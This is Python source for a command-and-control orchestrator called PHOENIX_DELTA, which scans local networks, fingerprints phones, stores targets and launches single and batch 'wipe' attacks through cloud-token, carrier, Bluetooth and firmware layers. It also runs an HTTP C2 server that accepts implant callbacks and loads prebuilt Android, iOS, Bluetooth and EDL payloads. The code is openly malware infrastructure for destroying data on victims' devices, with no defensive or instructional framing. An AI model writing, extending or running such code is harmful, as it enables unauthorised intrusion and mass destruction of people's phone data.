"""
PHOENIX_DELTA v9.0 — C2 Master Controller
Asyncio-based orchestrator that coordinates all four attack layers.
"""

import asyncio
import aiohttp
from aiohttp import web
import json
import base64
import os
import ssl
import time
import logging
import random
import string
from datetime import datetime
from typing import Dict, List, Optional, Any

from c2_server.config import CONFIG
from c2_server.database import TargetsDB
from layers.cloud_master import CloudMaster
from layers.carrier_control import CarrierControl
from layers.proximity_zero import ProximityZero
from layers.firmware_boot import FirmwareBoot

logging.basicConfig(
    level=getattr(logging, CONFIG.c2.log_level),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
log = logging.getLogger("PHOENIX_DELTA")


class PhoenixOrchestrator:
    """
    The brain. Coordinates Cloud-Master, Carrier-Control, Proximity-Zero,
    and Firmware-Boot layers into a unified attack pipeline.
    """

    def __init__(self):
        self.db = TargetsDB(CONFIG.c2.db_path)
        self.cloud = CloudMaster(CONFIG.cloud)
        self.carrier = CarrierControl(CONFIG.carrier)
        self.proximity = ProximityZero(CONFIG.bluetooth)
        self.firmware = FirmwareBoot(CONFIG.firmware)
        self.payload_store: Dict[str, bytes] = {}
        self.wipe_semaphore = asyncio.Semaphore(CONFIG.c2.max_concurrent_wipes)
        self.running = False

    async def initialize(self):
        """Initialize database, load payloads, verify connectivity."""
        await self.db.connect()
        self._load_payloads()
        log.info("[*] PHOENIX_DELTA v%s initialized. Database connected.",
                 CONFIG.version)

    def _load_payloads(self):
        """Load pre-built payloads from the payloads directory."""
        payload_dir = "payloads"
        os.makedirs(payload_dir, exist_ok=True)

        payload_files = {
            "android": "android_payload.bin",
            "ios_profile": "ios_profile.mobileconfig",
            "bluetooth_exploit": "bt_exploit.hex",
            "edl_loader": "edl_loader.bin",
        }

        for key, filename in payload_files.items():
            path = os.path.join(payload_dir, filename)
            if os.path.exists(path):
                with open(path, "rb") as f:
                    self.payload_store[key] = f.read()
                log.info("[+] Loaded payload: %s (%d bytes)",
                         key, len(self.payload_store[key]))
            else:
                self.payload_store[key] = b""
                log.warning("[!] Payload not found: %s", path)

    # ─── Network Scanning ─────────────────────────────────────────────

    async def scan_network(self, subnet: str = "192.168.1.0/24") -> List[Dict]:
        """
        Network discovery — auto-detects OS and uses nmap (Linux) or
        pure Python ARP scan (Windows).
        Returns list of discovered devices with IP, MAC, open ports.
        """
        log.info("[*] Scanning network: %s", subnet)

        ips = []
        if os.name == "nt":
            # Windows: use arp -a to find live hosts
            proc = await asyncio.create_subprocess_shell(
                "arp -a",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await proc.communicate()
            import re
            output = stdout.decode("utf-8", errors="ignore")
            # arp -a on Windows outputs IPs like: 192.168.0.100    aa-bb-cc-dd-ee-ff
            ip_pattern = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
            seen = set()
            for line in output.split("\n"):
                match = ip_pattern.search(line)
                if match:
                    ip = match.group(1)
                    # Skip broadcast, multicast, and gateway
                    if ip.endswith(".255") or ip.endswith(".0"):
                        continue
                    if ip not in seen:
                        seen.add(ip)
                        ips.append(ip)
            log.info("[*] ARP scan found %d IPs", len(ips))
        else:
            # Linux: use nmap
            proc = await asyncio.create_subprocess_shell(
                f"nmap -sn {subnet} --open -oG - 2>/dev/null | "
                f"grep 'Up' | awk '{{print $2}}'",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await proc.communicate()
            ips = [ip.strip() for ip in stdout.decode().split("\n") if ip.strip()]

        devices = []
        for ip in ips:
            # Fingerprint each device
            device = await self._fingerprint_device(ip)
            if device:
                devices.append(device)
                await self.db.store_network_node(
                    ip=ip,
                    mac=device.get("mac"),
                    hostname=device.get("hostname"),
                    ports=device.get("open_ports"),
                    fingerprint=device.get("fingerprint")
                )

        log.info("[+] Discovered %d devices on %s", len(devices), subnet)
        return devices

    async def _fingerprint_device(self, ip: str) -> Optional[Dict]:
        """Fingerprint a device — works on both Windows and Linux."""
        if os.name == "nt":
            # Windows: basic ping + get hostname
            proc = await asyncio.create_subprocess_shell(
                f"ping -n 1 -w 1000 {ip}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
            if proc.returncode != 0:
                return None
            return {
                "ip": ip,
                "hostname": ip,
                "open_ports": [],
                "fingerprint": "alive",
            }
        else:
            # Linux: nmap fingerprint
            proc = await asyncio.create_subprocess_shell(
                f"nmap -sV -O --top-ports 100 {ip} -oX - 2>/dev/null | "
                f"grep -E '(osmatch|port|service)' | head -20",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
            output = stdout.decode()

            if not output:
                return None

            open_ports = []
            fingerprint = "unknown"
            hostname = ip

            for line in output.split("\n"):
                if "portid=" in line:
                    port = line.split('portid="')[1].split('"')[0] if 'portid="' in line else ""
                    if port:
                        open_ports.append(port)
                if "name=" in line and 'name="' in line:
                    hostname = line.split('name="')[1].split('"')[0]
                if "name=" in line and "accuracy" in line:
                    fingerprint = line.split('name="')[1].split('"')[0]

            return {
                "ip": ip,
                "hostname": hostname,
                "open_ports": open_ports,
                "fingerprint": fingerprint,
            }

    # ─── Target Enrichment ────────────────────────────────────────────

    async def enrich_target(self, ip: str) -> Dict:
        """
        Gather all available info about a target:
        IP, MAC, open ports, potential device type, carrier info.
        """
        fingerprint = await self._fingerprint_device(ip)

        target = {
            "ip_address": ip,
            "status": "discovered",
            "device_type": self._guess_device_type(fingerprint),
            "last_seen": time.time(),
        }

        if fingerprint:
            target["wifi_mac"] = fingerprint.get("mac")
            target["device_model"] = fingerprint.get("fingerprint")
            target["os_version"] = fingerprint.get("fingerprint")

        target_id = await self.db.upsert_target(target)
        target["id"] = target_id

        return target

    def _guess_device_type(self, fingerprint: Optional[Dict]) -> str:
        """Guess device OS from nmap fingerprint."""
        if not fingerprint:
            return "android"
        fp = fingerprint.get("fingerprint", "").lower()
        if "apple" in fp or "ios" in fp or "iphone" in fp:
            return "ios"
        elif "huawei" in fp:
            return "huawei"
        return "android"

    # ─── Single-Target Wipe ───────────────────────────────────────────

    async def wipe_target(self, target: Dict,
                           methods: List[str] = None) -> Dict:
        """
        Execute full multi-layer wipe against a single target.
        Runs all four layers in parallel where possible.
        """
        if methods is None:
            methods = ["cloud", "carrier", "proximity", "firmware"]

        log.info("[*] Initiating wipe against target: %s",
                 target.get("phone_number") or target.get("ip_address")
                 or target.get("imei", "unknown"))

        results = {
            "target": target,
            "methods": methods,
            "start_time": time.time(),
            "layers": {},
            "overall_success": False,
        }

        async with self.wipe_semaphore:
            tasks = []

            if "cloud" in methods and target.get("oauth_token"):
                tasks.append(("cloud", self.cloud.auto_wipe(target)))

            if "carrier" in methods and target.get("phone_number"):
                tasks.append(("carrier",
                              self.carrier.full_carrier_attack(
                                  target["phone_number"])))

            if "proximity" in methods and target.get("bluetooth_mac"):
                tasks.append(("proximity",
                              self.proximity.full_proximity_attack(
                                  bt_mac=target["bluetooth_mac"],
                                  wifi_target=target.get("wifi_mac"),
                                  target_os=target.get("device_type", "android"))))

            if "firmware" in methods and target.get("device_id"):
                tasks.append(("firmware",
                              self.firmware.full_firmware_kill(
                                  target["device_id"],
                                  target.get("device_type", "android"),
                                  target.get("device_model", "generic"))))

            task_coros = [t[1] for t in tasks]
            task_names = [t[0] for t in tasks]

            layer_results = await asyncio.gather(
                *task_coros, return_exceptions=True
            )

            for name, result in zip(task_names, layer_results):
                if isinstance(result, Exception):
                    results["layers"][name] = {
                        "success": False,
                        "error": str(result)
                    }
                else:
                    results["layers"][name] = result
                    if isinstance(result, dict) and result.get("any_success"):
                        results["overall_success"] = True

        results["end_time"] = time.time()
        results["duration_sec"] = results["end_time"] - results["start_time"]

        # Log to database
        target_id = target.get("id")
        if target_id:
            await self.db.log_wipe(
                target_id=target_id,
                method=",".join(methods),
                layer="multi",
                success=results["overall_success"],
                result=json.dumps(results["layers"], default=str),
                duration_ms=results["duration_sec"] * 1000
            )

        log.info("[+] Wipe completed in %.2fs — success: %s",
                 results["duration_sec"], results["overall_success"])

        return results

    # ─── Batch Wipe ───────────────────────────────────────────────────

    async def batch_wipe(self, targets: List[Dict] = None,
                          status_filter: str = "discovered",
                          delay: float = None) -> Dict:
        """
        Wipe multiple targets with optional delay between them.
        If no targets provided, grabs all from DB with status_filter.
        """
        if targets is None:
            targets = await self.db.get_all_targets(status=status_filter)

        delay = delay or CONFIG.c2.wipe_cooldown_sec

        log.info("[*] Batch wipe: %d targets", len(targets))

        results = {
            "total": len(targets),
            "completed": 0,
            "successful": 0,
            "failed": 0,
            "details": [],
        }

        for i, target in enumerate(targets):
            try:
                result = await self.wipe_target(target)
                results["details"].append(result)
                results["completed"] += 1
                if result["overall_success"]:
                    results["successful"] += 1
                else:
                    results["failed"] += 1
            except Exception as e:
                log.error("[!] Wipe failed for target %d: %s", i, str(e))
                results["failed"] += 1

            if delay > 0 and i < len(targets) - 1:
                await asyncio.sleep(delay + random.uniform(0, 0.5))

        log.info("[+] Batch wipe complete: %d/%d successful",
                 results["successful"], results["total"])

        return results

    # ─── C2 HTTP Server ───────────────────────────────────────────────

    async def start_c2_server(self):
        """Start the C2 HTTP/HTTPS server for callbacks and control."""
        app = web.Application()

        app.router.add_get("/api/status", self._handle_status)
        app.router.add_get("/api/scan", self._handle_scan)
        app.router.add_post("/api/scan", self._handle_scan)
        app.router.add_post("/api/wipe", self._handle_wipe)
        app.router.add_post("/api/wipe/batch", self._handle_batch_wipe)
        app.router.add_get("/api/targets", self._handle_get_targets)
        app.router.add_post("/api/targets", self._handle_add_target)
        app.router.add_get("/api/stats", self._handle_stats)
        app.router.add_post("/api/callback", self._handle_callback)

        runner = web.AppRunner(app)
        await runner.setup()

        if CONFIG.c2.use_ssl:
            ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            if os.path.exists(CONFIG.c2.ssl_cert_path):
                ssl_ctx.load_cert_chain(
                    CONFIG.c2.ssl_cert_path,
                    CONFIG.c2.ssl_key_path
                )
            site = web.TCPSite(
                runner, CONFIG.c2.listen_host, CONFIG.c2.listen_port,
                ssl_context=ssl_ctx
            )
        else:
            site = web.TCPSite(
                runner, CONFIG.c2.listen_host, CONFIG.c2.listen_port
            )

        await site.start()
        log.info("[*] C2 Server listening on %s:%d (SSL: %s)",
                 CONFIG.c2.listen_host, CONFIG.c2.listen_port,
                 CONFIG.c2.use_ssl)

    async def _handle_status(self, request):
        return web.json_response({
            "status": "online",
            "version": CONFIG.version,
            "codename": CONFIG.codename,
            "uptime": time.time(),
        })

    async def _handle_scan(self, request):
        try:
            if request.method == "POST":
                data = await request.json()
                subnet = data.get("subnet", "192.168.0.0/24")
            else:
                subnet = request.query.get("subnet", "192.168.0.0/24")
            devices = await self.scan_network(subnet)
            return web.json_response({
                "devices_found": len(devices),
                "devices": devices,
            })
        except Exception as e:
            log.error("[!] Scan error: %s", str(e))
            return web.json_response({"error": str(e)}, status=500)

    async def _handle_wipe(self, request):
        data = await request.json()
        target = await self.enrich_target(data.get("ip_address", ""))

        if data.get("imei"):
            target["imei"] = data["imei"]
        if data.get("phone_number"):
            target["phone_number"] = data["phone_number"]
        if data.get("oauth_token"):
            target["oauth_token"] = data["oauth_token"]
        if data.get("udid"):
            target["udid"] = data["udid"]
        if data.get("bluetooth_mac"):
            target["bluetooth_mac"] = data["bluetooth_mac"]
        if data.get("device_id"):
            target["device_id"] = data["device_id"]

        target_id = await self.db.upsert_target(target)
        target["id"] = target_id

        methods = data.get("methods", ["cloud", "carrier", "proximity", "firmware"])
        result = await self.wipe_target(target, methods)

        return web.json_response(result, dumps=str)

    async def _handle_batch_wipe(self, request):
        data = await request.json()
        result = await self.batch_wipe(
            status_filter=data.get("status", "discovered"),
            delay=data.get("delay", CONFIG.c2.wipe_cooldown_sec)
        )
        return web.json_response(result, dumps=str)

    async def _handle_get_targets(self, request):
        status = request.query.get("status")
        targets = await self.db.get_all_targets(status=status)
        return web.json_response({"targets": targets}, dumps=str)

    async def _handle_add_target(self, request):
        data = await request.json()
        target_id = await self.db.upsert_target(data)
        return web.json_response({
            "target_id": target_id,
            "status": "added",
        })

    async def _handle_stats(self, request):
        stats = await self.db.get_wipe_stats()
        return web.json_response(stats)

    async def _handle_callback(self, request):
        """Handle callbacks from implants."""
        data = await request.json()
        log.info("[+] Callback from %s: %s",
                 data.get("device_id", "unknown"), data.get("type", "unknown"))
        return web.json_response({"ack": True})

    # ─── Main Loop ────────────────────────────────────────────────────

    async def main(self):
        """Main entry point — init, start server, begin scanning."""
        await self.initialize()
        await self.start_c2_server()

        self.running = True
        log.info("[*] PHOENIX_DELTA v%s — Online. Awaiting commands.",
                 CONFIG.version)

        # Keep alive
        try:
            while self.running:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            log.info("[*] Shutting down PHOENIX_DELTA...")
            self.running = False
            await self.db.close()


if __name__ == "__main__":
    c2 = PhoenixOrchestrator()
    asyncio.run(c2.main())
